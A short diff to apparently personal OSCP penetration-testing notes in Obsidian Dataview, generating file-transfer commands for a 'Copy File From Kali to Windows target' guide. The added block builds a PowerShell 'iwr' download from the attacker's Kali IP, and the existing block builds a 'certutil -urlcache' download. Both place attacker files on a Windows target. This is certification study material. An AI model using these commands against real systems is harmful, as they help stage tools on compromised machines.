@@ -27,6 +27,15 @@ const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page
 
 const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
 
+const command = `iwr http://${KaliIP}:80/${filename} -OutFile ${filename}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
+
 const command = `certutil -urlcache -split -f http://${KaliIP}:80/${filename} ${filename}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
